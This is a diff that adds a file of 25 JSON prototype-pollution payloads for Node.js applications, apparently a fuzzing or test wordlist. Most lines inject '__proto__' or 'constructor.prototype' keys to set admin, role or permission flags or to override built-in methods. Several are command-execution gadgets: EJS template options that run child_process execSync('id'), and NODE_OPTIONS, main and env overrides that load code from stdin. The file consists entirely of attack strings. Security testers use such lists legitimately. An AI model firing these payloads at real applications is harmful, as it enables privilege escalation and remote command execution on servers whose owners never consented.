@@ -1,0 +1,25 @@
+{"__proto__":{"admin":true}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"authorized":true}}
+{"__proto__":{"debug":true}}
+{"__proto__":{"polluted":"yes"}}
+{"__proto__":{"constructor":{"prototype":{"admin":true}}}}
+{"constructor":{"prototype":{"admin":true}}}
+{"__proto__":{"toString":"polluted"}}
+{"__proto__":{"valueOf":"polluted"}}
+{"__proto__":{"hasOwnProperty":"polluted"}}
+{"__proto__":{"isPrototypeOf":"polluted"}}
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
+{"__proto__":{"compileDebug":true,"self":true,"line":1}}
+{"__proto__":{"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"allowedExtensions":["js","ejs"]}}
+{"__proto__":{"env":{"LOADED_MOCHA_OPTS":"--require /dev/stdin"}}}
+{"__proto__":{"main":"/dev/stdin"}}
+{"__proto__":{"shell":true}}
+{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}
+{"a":"b","__proto__":{"admin":true}}
+{"constructor.prototype.admin":true}
+{"__proto__.admin":true}
+{"__proto__":{"type":"admin"}}
+{"__proto__":{"permissions":["admin","read","write","delete"]}}
